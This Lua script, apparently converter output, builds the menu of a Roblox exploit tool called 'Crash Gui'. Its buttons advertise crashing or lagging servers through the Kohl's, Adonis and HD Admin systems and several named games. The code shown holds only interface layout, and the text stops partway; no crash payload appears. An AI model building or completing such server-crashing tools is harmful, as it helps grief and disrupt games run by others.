-- Gui to Lua
-- Version: 3.2

-- Instances:
local plr = game.Players.LocalPlayer
if game.PlaceId == 7033503802 then
	plr:Kick("This Game Is Blacklisted!")
end

local cuersyzhub = Instance.new("ScreenGui")
local open = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Home = Instance.new("TextButton")
local Gui = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Welcome = Instance.new("TextLabel")
local Playername = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local ImageLabel_2 = Instance.new("ImageLabel")
local Glow = Instance.new("ImageLabel")
local w = Instance.new("TextButton")
local w_2 = Instance.new("TextButton")
local w_3 = Instance.new("TextButton")
local how = Instance.new("TextButton")
local Home_2 = Instance.new("TextButton")
local morphsframe = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Glow_2 = Instance.new("ImageLabel")
local Discordtitle = Instance.new("TextLabel")
local Discordtitle_2 = Instance.new("TextLabel")
local UICorner_5 = Instance.new("UICorner")
local Discordtitle_3 = Instance.new("TextLabel")
local UICorner_6 = Instance.new("UICorner")
local Discordtitle_4 = Instance.new("TextLabel")
local Discordtitle_5 = Instance.new("TextLabel")
local UICorner_7 = Instance.new("UICorner")
local animsframe = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local Glow_3 = Instance.new("ImageLabel")
local Discordtitle_6 = Instance.new("TextLabel")
local Animations = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local Anims = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Anims_2 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local a2 = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local Glow_4 = Instance.new("ImageLabel")
local Discordtitle_7 = Instance.new("TextLabel")
local Discordtitle_8 = Instance.new("TextLabel")
local UICorner_12 = Instance.new("UICorner")
local how_2 = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local Discordtitle_9 = Instance.new("TextLabel")
local UICorner_14 = Instance.new("UICorner")
local how_3 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local how_4 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local a1 = Instance.new("Frame")
local UICorner_17 = Instance.new("UICorner")
local Glow_5 = Instance.new("ImageLabel")
local Discordtitle_10 = Instance.new("TextLabel")
local Textbox = Instance.new("TextBox")
local UICorner_18 = Instance.new("UICorner")
local Discordtitle_11 = Instance.new("TextLabel")
local Discordtitle_12 = Instance.new("TextLabel")
local a1_2 = Instance.new("Frame")
local UICorner_19 = Instance.new("UICorner")
local Border = Instance.new("Frame")
local White = Instance.new("Frame")
local UICorner_20 = Instance.new("UICorner")
local Homescreen = Instance.new("Frame")
local UICorner_21 = Instance.new("UICorner")
local Glow_6 = Instance.new("ImageLabel")
local Discordtitle_13 = Instance.new("TextLabel")
local UICorner_22 = Instance.new("UICorner")
local Frame = Instance.new("Frame")
local UICorner_23 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local Poggers = Instance.new("Frame")
local UICorner_24 = Instance.new("UICorner")
local Glow_7 = Instance.new("ImageLabel")
local Sidebar = Instance.new("Frame")
local UICorner_25 = Instance.new("UICorner")
local Glow_8 = Instance.new("ImageLabel")
local Home_3 = Instance.new("TextButton")

--Properties:

cuersyzhub.Name = "cuersyzhub"
cuersyzhub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
cuersyzhub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

open.Name = "open"
open.Parent = cuersyzhub
open.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
open.ClipsDescendants = true
open.Position = UDim2.new(-0.000225545096, 0, 0.366640925, 0)
open.Size = UDim2.new(0, 173, 0, 44)
open.Visible = false

UICorner.Parent = open

Home.Name = "Home"
Home.Parent = open
Home.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Home.BackgroundTransparency = 1.000
Home.Position = UDim2.new(0.0857143104, 0, 0.0551473461, 0)
Home.Size = UDim2.new(0, 158, 0, 38)
Home.ZIndex = 2
Home.Font = Enum.Font.GothamBold
Home.Text = "Crash Gui"
Home.TextColor3 = Color3.fromRGB(255, 255, 255)
Home.TextSize = 20.000
Home.TextXAlignment = Enum.TextXAlignment.Left

Gui.Name = "Gui"
Gui.Parent = cuersyzhub
Gui.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
Gui.ClipsDescendants = true
Gui.Position = UDim2.new(0.293159664, 0, 0.265643418, 0)
Gui.Size = UDim2.new(0, 663, 0, 375)

UICorner_2.Parent = Gui

Welcome.Name = "Welcome"
Welcome.Parent = Gui
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.BackgroundTransparency = 1.000
Welcome.Position = UDim2.new(0.11792586, 0, 0.125249103, 0)
Welcome.Size = UDim2.new(0, 63, 0, 21)
Welcome.ZIndex = 2
Welcome.Font = Enum.Font.GothamBold
Welcome.Text = "Whitelisted"
Welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
Welcome.TextSize = 10.000
Welcome.TextTransparency = 0.300
Welcome.TextWrapped = true
Welcome.TextXAlignment = Enum.TextXAlignment.Left

Playername.Name = "Playername"
Playername.Parent = Gui
Playername.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Playername.BackgroundTransparency = 1.000
Playername.Position = UDim2.new(0.117925815, 0, 0.0692491084, 0)
Playername.Size = UDim2.new(0, 141, 0, 21)
Playername.ZIndex = 2
Playername.Font = Enum.Font.GothamBold
Playername.Text = "Oyuncu"
Playername.TextColor3 = Color3.fromRGB(255, 255, 255)
Playername.TextScaled = true
Playername.TextSize = 20.000
Playername.TextWrapped = true
Playername.TextXAlignment = Enum.TextXAlignment.Left

ImageLabel.Parent = Gui
ImageLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
ImageLabel.BackgroundTransparency = 0.600
ImageLabel.Position = UDim2.new(0.0184138976, 0, 0.0453333333, 0)
ImageLabel.Size = UDim2.new(0, 62, 0, 64)
ImageLabel.ZIndex = 3
ImageLabel.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=1852211292&width=420&height=420&format=png"

UICorner_3.CornerRadius = UDim.new(0, 40)
UICorner_3.Parent = ImageLabel

ImageLabel_2.Parent = Gui
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.Position = UDim2.new(0.207769305, 0, 0.130666673, 0)
ImageLabel_2.Size = UDim2.new(0, 15, 0, 15)
ImageLabel_2.ZIndex = 2
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=6809020012"

Glow.Name = "Glow"
Glow.Parent = Gui
Glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow.BackgroundTransparency = 1.000
Glow.BorderSizePixel = 0
Glow.Position = UDim2.new(0, -15, 0, -15)
Glow.Size = UDim2.new(1, 30, 1, 30)
Glow.ZIndex = 0
Glow.Image = "rbxassetid://5028857084"
Glow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(22, 22, 278, 278)

w.Name = "w"
w.Parent = Gui
w.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
w.BackgroundTransparency = 1.000
w.Position = UDim2.new(0.0294541121, 0, 0.574558377, 0)
w.Size = UDim2.new(0, 170, 0, 33)
w.ZIndex = 2
w.Font = Enum.Font.GothamBold
w.Text = "Game Crash Scripts"
w.TextColor3 = Color3.fromRGB(255, 255, 255)
w.TextScaled = true
w.TextSize = 14.000
w.TextWrapped = true
w.TextXAlignment = Enum.TextXAlignment.Left

w_2.Name = "w"
w_2.Parent = Gui
w_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
w_2.BackgroundTransparency = 1.000
w_2.Position = UDim2.new(0.0309624076, 0, 0.449225038, 0)
w_2.Size = UDim2.new(0, 133, 0, 50)
w_2.ZIndex = 2
w_2.Font = Enum.Font.GothamBold
w_2.Text = "Adonis Crash"
w_2.TextColor3 = Color3.fromRGB(255, 255, 255)
w_2.TextSize = 20.000
w_2.TextXAlignment = Enum.TextXAlignment.Left

w_3.Name = "w"
w_3.Parent = Gui
w_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
w_3.BackgroundTransparency = 1.000
w_3.Position = UDim2.new(0.0294541121, 0, 0.662558436, 0)
w_3.Size = UDim2.new(0, 133, 0, 50)
w_3.ZIndex = 2
w_3.Font = Enum.Font.GothamBold
w_3.Text = "Credits"
w_3.TextColor3 = Color3.fromRGB(255, 255, 255)
w_3.TextSize = 20.000
w_3.TextXAlignment = Enum.TextXAlignment.Left

how.Name = "how"
how.Parent = Gui
how.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
how.BackgroundTransparency = 1.000
how.Position = UDim2.new(0.0309624076, 0, 0.334558338, 0)
how.Size = UDim2.new(0, 133, 0, 50)
how.ZIndex = 2
how.Font = Enum.Font.GothamBold
how.Text = "Kohl's Crash"
how.TextColor3 = Color3.fromRGB(255, 255, 255)
how.TextSize = 20.000
how.TextXAlignment = Enum.TextXAlignment.Left

Home_2.Name = "Home"
Home_2.Parent = Gui
Home_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Home_2.BackgroundTransparency = 1.000
Home_2.Position = UDim2.new(0.0309624076, 0, 0.222558334, 0)
Home_2.Size = UDim2.new(0, 133, 0, 50)
Home_2.ZIndex = 2
Home_2.Font = Enum.Font.GothamBold
Home_2.Text = "Menü"
Home_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Home_2.TextSize = 20.000
Home_2.TextXAlignment = Enum.TextXAlignment.Left

morphsframe.Name = "morphsframe"
morphsframe.Parent = Gui
morphsframe.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
morphsframe.ClipsDescendants = true
morphsframe.LayoutOrder = 1
morphsframe.Position = UDim2.new(0.340999991, 0, -0.986999989, 0)
morphsframe.Size = UDim2.new(0, 418, 0, 356)

UICorner_4.CornerRadius = UDim.new(0, 2)
UICorner_4.Parent = morphsframe

Glow_2.Name = "Glow"
Glow_2.Parent = morphsframe
Glow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_2.BackgroundTransparency = 1.000
Glow_2.BorderSizePixel = 0
Glow_2.Position = UDim2.new(0, -15, 0, -15)
Glow_2.Size = UDim2.new(1, 30, 1, 30)
Glow_2.ZIndex = 0
Glow_2.Image = "rbxassetid://5028857084"
Glow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_2.ScaleType = Enum.ScaleType.Slice
Glow_2.SliceCenter = Rect.new(22, 22, 278, 278)

Discordtitle.Name = "Discordtitle"
Discordtitle.Parent = morphsframe
Discordtitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle.BackgroundTransparency = 1.000
Discordtitle.Position = UDim2.new(0.259227693, 0, 0.000681638718, 0)
Discordtitle.Size = UDim2.new(0, 200, 0, 50)
Discordtitle.ZIndex = 2
Discordtitle.Font = Enum.Font.GothamBlack
Discordtitle.Text = "Credits"
Discordtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle.TextSize = 23.000

Discordtitle_2.Name = "Discordtitle"
Discordtitle_2.Parent = morphsframe
Discordtitle_2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Discordtitle_2.Position = UDim2.new(0.242481291, 0, 0.180456921, 0)
Discordtitle_2.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_2.ZIndex = 2
Discordtitle_2.Font = Enum.Font.GothamBlack
Discordtitle_2.Text = "Sublime#4088"
Discordtitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_2.TextSize = 23.000

UICorner_5.Parent = Discordtitle_2

Discordtitle_3.Name = "Discordtitle"
Discordtitle_3.Parent = morphsframe
Discordtitle_3.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Discordtitle_3.Position = UDim2.new(0.244873643, 0, 0.343378276, 0)
Discordtitle_3.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_3.ZIndex = 2
Discordtitle_3.Font = Enum.Font.GothamBlack
Discordtitle_3.Text = "Cuersy#0001"
Discordtitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_3.TextSize = 23.000

UICorner_6.Parent = Discordtitle_3

Discordtitle_4.Name = "Discordtitle"
Discordtitle_4.Parent = morphsframe
Discordtitle_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_4.BackgroundTransparency = 1.000
Discordtitle_4.Position = UDim2.new(0.244873628, 0, 0.548434436, 0)
Discordtitle_4.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_4.ZIndex = 2
Discordtitle_4.Font = Enum.Font.GothamBlack
Discordtitle_4.Text = "Discord"
Discordtitle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_4.TextSize = 23.000

Discordtitle_5.Name = "Discordtitle"
Discordtitle_5.Parent = morphsframe
Discordtitle_5.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Discordtitle_5.Position = UDim2.new(0.244873643, 0, 0.688883901, 0)
Discordtitle_5.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_5.ZIndex = 2
Discordtitle_5.Font = Enum.Font.GothamBlack
Discordtitle_5.Text = "https://discord.gg/gkRfa4V6MB"
Discordtitle_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_5.TextSize = 23.000

UICorner_7.Parent = Discordtitle_5

animsframe.Name = "animsframe"
animsframe.Parent = Gui
animsframe.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
animsframe.ClipsDescendants = true
animsframe.LayoutOrder = 1
animsframe.Position = UDim2.new(0.340999991, 0, -0.986999989, 0)
animsframe.Size = UDim2.new(0, 418, 0, 356)

UICorner_8.CornerRadius = UDim.new(0, 2)
UICorner_8.Parent = animsframe

Glow_3.Name = "Glow"
Glow_3.Parent = animsframe
Glow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_3.BackgroundTransparency = 1.000
Glow_3.BorderSizePixel = 0
Glow_3.Position = UDim2.new(0, -15, 0, -15)
Glow_3.Size = UDim2.new(1, 30, 1, 30)
Glow_3.ZIndex = 0
Glow_3.Image = "rbxassetid://5028857084"
Glow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_3.ScaleType = Enum.ScaleType.Slice
Glow_3.SliceCenter = Rect.new(22, 22, 278, 278)

Discordtitle_6.Name = "Discordtitle"
Discordtitle_6.Parent = animsframe
Discordtitle_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_6.BackgroundTransparency = 1.000
Discordtitle_6.Position = UDim2.new(0.259227693, 0, 0.000681638718, 0)
Discordtitle_6.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_6.Font = Enum.Font.GothamBlack
Discordtitle_6.Text = "Kohl's Crash"
Discordtitle_6.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_6.TextSize = 23.000

Animations.Name = "Animations"
Animations.Parent = animsframe
Animations.Active = true
Animations.BackgroundColor3 = Color3.fromRGB(27, 42, 53)
Animations.BackgroundTransparency = 1.000
Animations.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations.BorderSizePixel = 0
Animations.Position = UDim2.new(0.0152532402, 0, 0.141131118, 0)
Animations.Size = UDim2.new(0, 404, 0, 299)
Animations.BottomImage = ""
Animations.CanvasSize = UDim2.new(0, 0, 8, 0)
Animations.MidImage = ""
Animations.ScrollingEnabled = false
Animations.TopImage = ""

UIListLayout.Parent = Animations
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

Anims.Name = "Anims"
Anims.Parent = animsframe
Anims.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
Anims.BorderColor3 = Color3.fromRGB(27, 42, 53)
Anims.Position = UDim2.new(0.0416411608, 0, 0.286516845, 0)
Anims.Size = UDim2.new(0, 370, 0, 38)
Anims.ZIndex = 2
Anims.Font = Enum.Font.GothamBold
Anims.Text = " Kohl's Crash V2"
Anims.TextColor3 = Color3.fromRGB(255, 255, 255)
Anims.TextSize = 20.000
Anims.TextXAlignment = Enum.TextXAlignment.Left

UICorner_9.Parent = Anims

Anims_2.Name = "Anims"
Anims_2.Parent = animsframe
Anims_2.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
Anims_2.Position = UDim2.new(0.0416411608, 0, 0.157303378, 0)
Anims_2.Size = UDim2.new(0, 370, 0, 38)
Anims_2.ZIndex = 2
Anims_2.Font = Enum.Font.GothamBold
Anims_2.Text = " Kohl's Crash"
Anims_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Anims_2.TextSize = 20.000
Anims_2.TextXAlignment = Enum.TextXAlignment.Left

UICorner_10.Parent = Anims_2

a2.Name = "a2"
a2.Parent = Gui
a2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
a2.ClipsDescendants = true
a2.LayoutOrder = 1
a2.Position = UDim2.new(0.340999991, 0, -0.986999989, 0)
a2.Size = UDim2.new(0, 418, 0, 356)

UICorner_11.CornerRadius = UDim.new(0, 2)
UICorner_11.Parent = a2

Glow_4.Name = "Glow"
Glow_4.Parent = a2
Glow_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_4.BackgroundTransparency = 1.000
Glow_4.BorderSizePixel = 0
Glow_4.Position = UDim2.new(0, -15, 0, -15)
Glow_4.Size = UDim2.new(1, 30, 1, 30)
Glow_4.ZIndex = 0
Glow_4.Image = "rbxassetid://5028857084"
Glow_4.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_4.ScaleType = Enum.ScaleType.Slice
Glow_4.SliceCenter = Rect.new(22, 22, 278, 278)

Discordtitle_7.Name = "Discordtitle"
Discordtitle_7.Parent = a2
Discordtitle_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_7.BackgroundTransparency = 1.000
Discordtitle_7.Position = UDim2.new(0.259227693, 0, 0.000681638718, 0)
Discordtitle_7.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_7.ZIndex = 2
Discordtitle_7.Font = Enum.Font.GothamBlack
Discordtitle_7.Text = "Game Crash Scripts"
Discordtitle_7.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_7.TextSize = 23.000

Discordtitle_8.Name = "Discordtitle"
Discordtitle_8.Parent = a2
Discordtitle_8.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Discordtitle_8.Position = UDim2.new(0.0460790619, 0, 0.194501907, 0)
Discordtitle_8.Size = UDim2.new(0, 379, 0, 40)
Discordtitle_8.ZIndex = 2
Discordtitle_8.Font = Enum.Font.GothamBlack
Discordtitle_8.Text = "HD ADMIN LAG SERVER"
Discordtitle_8.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_8.TextSize = 23.000

UICorner_12.Parent = Discordtitle_8

how_2.Name = "how"
how_2.Parent = a2
how_2.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
how_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
how_2.Position = UDim2.new(0.0477087572, 0, 0.320513427, 0)
how_2.Size = UDim2.new(0, 375, 0, 38)
how_2.ZIndex = 2
how_2.Font = Enum.Font.GothamBold
how_2.Text = " HD Admin Lag"
how_2.TextColor3 = Color3.fromRGB(255, 255, 255)
how_2.TextSize = 20.000
how_2.TextXAlignment = Enum.TextXAlignment.Left

UICorner_13.Parent = how_2

Discordtitle_9.Name = "Discordtitle"
Discordtitle_9.Parent = a2
Discordtitle_9.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Discordtitle_9.Position = UDim2.new(0.0460790619, 0, 0.461355835, 0)
Discordtitle_9.Size = UDim2.new(0, 379, 0, 40)
Discordtitle_9.ZIndex = 2
Discordtitle_9.Font = Enum.Font.GothamBlack
Discordtitle_9.Text = "Other Game Crasher"
Discordtitle_9.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_9.TextSize = 23.000

UICorner_14.Parent = Discordtitle_9

how_3.Name = "how"
how_3.Parent = a2
how_3.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
how_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
how_3.Position = UDim2.new(0.0548857898, 0, 0.58174938, 0)
how_3.Size = UDim2.new(0, 375, 0, 38)
how_3.ZIndex = 2
how_3.Font = Enum.Font.GothamBold
how_3.Text = " GPO Crash"
how_3.TextColor3 = Color3.fromRGB(255, 255, 255)
how_3.TextSize = 20.000
how_3.TextXAlignment = Enum.TextXAlignment.Left

UICorner_15.Parent = how_3

how_4.Name = "how"
how_4.Parent = a2
how_4.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
how_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
how_4.Position = UDim2.new(0.0548857898, 0, 0.702535868, 0)
how_4.Size = UDim2.new(0, 375, 0, 38)
how_4.ZIndex = 2
how_4.Font = Enum.Font.GothamBold
how_4.Text = " Wauxy Crash"
how_4.TextColor3 = Color3.fromRGB(255, 255, 255)
how_4.TextSize = 20.000
how_4.TextXAlignment = Enum.TextXAlignment.Left

UICorner_16.Parent = how_4

a1.Name = "a1"
a1.Parent = Gui
a1.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
a1.ClipsDescendants = true
a1.LayoutOrder = 1
a1.Position = UDim2.new(0.340999991, 0, -0.986999989, 0)
a1.Size = UDim2.new(0, 418, 0, 356)

UICorner_17.CornerRadius = UDim.new(0, 2)
UICorner_17.Parent = a1

Glow_5.Name = "Glow"
Glow_5.Parent = a1
Glow_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_5.BackgroundTransparency = 1.000
Glow_5.BorderSizePixel = 0
Glow_5.Position = UDim2.new(0, -15, 0, -15)
Glow_5.Size = UDim2.new(1, 30, 1, 30)
Glow_5.ZIndex = 0
Glow_5.Image = "rbxassetid://5028857084"
Glow_5.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_5.ScaleType = Enum.ScaleType.Slice
Glow_5.SliceCenter = Rect.new(22, 22, 278, 278)

Discordtitle_10.Name = "Discordtitle"
Discordtitle_10.Parent = a1
Discordtitle_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_10.BackgroundTransparency = 1.000
Discordtitle_10.Position = UDim2.new(0.259227693, 0, 0.000681638718, 0)
Discordtitle_10.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_10.ZIndex = 2
Discordtitle_10.Font = Enum.Font.GothamBlack
Discordtitle_10.Text = "Adonis Crash"
Discordtitle_10.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_10.TextSize = 23.000

Textbox.Name = "Textbox"
Textbox.Parent = a1
Textbox.AnchorPoint = Vector2.new(0.5, 0)
Textbox.BackgroundColor3 = Color3.fromRGB(10, 11, 13)
Textbox.BorderSizePixel = 0
Textbox.Position = UDim2.new(0.490559846, 0, 0.547089994, 0)
Textbox.Size = UDim2.new(0.619617224, 0, 0.0649885833, 0)
Textbox.SizeConstraint = Enum.SizeConstraint.RelativeXX
Textbox.ZIndex = 2
Textbox.Font = Enum.Font.Unknown
Textbox.PlaceholderColor3 = Color3.fromRGB(0, 0, 255)
Textbox.PlaceholderText = "Type Here!"
Textbox.Text = ""
Textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
Textbox.TextScaled = true
Textbox.TextSize = 14.000
Textbox.TextWrapped = true

UICorner_18.Parent = Textbox

Discordtitle_11.Name = "Discordtitle"
Discordtitle_11.Parent = a1
Discordtitle_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_11.BackgroundTransparency = 1.000
Discordtitle_11.Position = UDim2.new(0.249658316, 0, 0.242254674, 0)
Discordtitle_11.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_11.ZIndex = 2
Discordtitle_11.Font = Enum.Font.GothamBlack
Discordtitle_11.Text = "Adonis Security Remote Crasher"
Discordtitle_11.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_11.TextSize = 23.000

Discordtitle_12.Name = "Discordtitle"
Discordtitle_12.Parent = a1
Discordtitle_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_12.BackgroundTransparency = 1.000
Discordtitle_12.Position = UDim2.new(0.259227693, 0, 0.891131043, 0)
Discordtitle_12.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_12.ZIndex = 2
Discordtitle_12.Font = Enum.Font.GothamBlack
Discordtitle_12.Text = "Tutorial In Discord Server."
Discordtitle_12.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_12.TextSize = 23.000

a1_2.Name = "a1"
a1_2.Parent = a1
a1_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
a1_2.ClipsDescendants = true
a1_2.LayoutOrder = 1
a1_2.Position = UDim2.new(0.0611340106, 0, 0.249337107, 0)
a1_2.Size = UDim2.new(0, 362, 0, 152)

UICorner_19.Parent = a1_2

Border.Name = "Border"
Border.Parent = Gui
Border.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Border.BorderSizePixel = 0
Border.Position = UDim2.new(0.319272697, 0, 0, 0)
Border.Size = UDim2.new(0, 8, 0, 375)

White.Name = "White"
White.Parent = Gui
White.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
White.Position = UDim2.new(0.0226244349, 0, 0.250666678, 0)
White.Size = UDim2.new(0, 174, 0, 28)

UICorner_20.CornerRadius = UDim.new(0, 4)
UICorner_20.Parent = White

Homescreen.Name = "Homescreen"
Homescreen.Parent = Gui
Homescreen.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Homescreen.ClipsDescendants = true
Homescreen.LayoutOrder = 1
Homescreen.Position = UDim2.new(0.351999998, 0, 0.0289999992, 0)
Homescreen.Size = UDim2.new(0, 418, 0, 356)

UICorner_21.CornerRadius = UDim.new(0, 2)
UICorner_21.Parent = Homescreen

Glow_6.Name = "Glow"
Glow_6.Parent = Homescreen
Glow_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_6.BackgroundTransparency = 1.000
Glow_6.BorderSizePixel = 0
Glow_6.Position = UDim2.new(0, -15, 0, -15)
Glow_6.Size = UDim2.new(1, 30, 1, 30)
Glow_6.ZIndex = 0
Glow_6.Image = "rbxassetid://5028857084"
Glow_6.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_6.ScaleType = Enum.ScaleType.Slice
Glow_6.SliceCenter = Rect.new(22, 22, 278, 278)

Discordtitle_13.Name = "Discordtitle"
Discordtitle_13.Parent = Homescreen
Discordtitle_13.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Discordtitle_13.BackgroundTransparency = 1.000
Discordtitle_13.Position = UDim2.new(0.328605682, 0, -0.0330262333, 0)
Discordtitle_13.Size = UDim2.new(0, 132, 0, 53)
Discordtitle_13.Font = Enum.Font.GothamBlack
Discordtitle_13.Text = "Menü"
Discordtitle_13.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_13.TextSize = 23.000

UICorner_22.Parent = Discordtitle_13

Frame.Parent = Homescreen
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.Position = UDim2.new(0.0076791863, 0, 0.809670448, 0)
Frame.Size = UDim2.new(0, 406, 0, 53)

UICorner_23.CornerRadius = UDim.new(0, 20)
UICorner_23.Parent = Frame

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(-0.0930735916, 0, -0.000449597836, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 43)
TextLabel.Font = Enum.Font.GothamBlack
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 25.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0187167469, 0, -0.0926825702, 0)
TextLabel_2.Size = UDim2.new(0, 387, 0, 61)
TextLabel_2.Font = Enum.Font.GothamMedium
TextLabel_2.Text = "Datsersy V3.1a [Beta]"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 20.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.13201724, 0, -4.62098408, 0)
TextLabel_3.Size = UDim2.new(0, 302, 0, 49)
TextLabel_3.Font = Enum.Font.GothamMedium
TextLabel_3.Text = "- Güncellemeler -"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 20.000
TextLabel_3.TextWrapped = true

TextLabel_4.Parent = Frame
TextLabel_4.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.134480298, 0, -3.28136134, 0)
TextLabel_4.Size = UDim2.new(0, 302, 0, 49)
TextLabel_4.Font = Enum.Font.Unknown
TextLabel_4.Text = "-Yeni Gui"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 20.000
